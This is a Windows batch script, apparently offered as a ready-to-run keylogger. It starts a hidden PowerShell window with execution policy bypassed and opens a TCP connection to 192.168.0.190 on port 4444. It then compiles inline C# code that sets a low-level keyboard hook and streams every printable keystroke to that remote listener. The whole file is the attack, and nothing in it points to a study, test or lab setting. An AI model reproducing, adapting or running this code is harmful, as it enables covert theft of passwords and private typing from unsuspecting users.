@echo off
start /b powershell -WindowStyle Hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('192.168.0.190',4444);$s=$c.GetStream();$src='using System;using System.Runtime.InteropServices;using System.Windows.Forms;public class KLog{private const int WH_KEYBOARD_LL=13,WM_KEYDOWN=0x100;private delegate IntPtr LowLevelKeyboardProc(int nCode,IntPtr wParam,IntPtr lParam);private static LowLevelKeyboardProc _proc=HookCallback;private static IntPtr _hookID=IntPtr.Zero;[DllImport(\"user32.dll\")]static extern IntPtr SetWindowsHookEx(int id,LowLevelKeyboardProc lpfn,IntPtr hMod,uint threadId);[DllImport(\"user32.dll\")]static extern bool UnhookWindowsHookEx(IntPtr hhk);[DllImport(\"user32.dll\")]static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);[DllImport(\"kernel32.dll\")]static extern IntPtr GetModuleHandle(string n);private static IntPtr HookCallback(int nCode,IntPtr wParam,IntPtr lParam){if(nCode>=0&&wParam==(IntPtr)WM_KEYDOWN){int vk=Marshal.ReadInt32(lParam);char ch=(char)vk;if(ch>=32&&ch<=126){byte[] b=System.Text.Encoding.ASCII.GetBytes(ch.ToString());Program.s.Write(b,0,b.Length);Program.s.Flush();}}return CallNextHookEx(_hookID,nCode,wParam,lParam);}public static void Start(){_hookID=SetWindowsHookEx(WH_KEYBOARD_LL,_proc,GetModuleHandle(null),0);Application.Run();UnhookWindowsHookEx(_hookID);}}public class Program{public static System.Net.Sockets.NetworkStream s;public static void Main(){KLog.Start();}}';Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms;[Program]::s=$s;[Program]::Main()"
exit
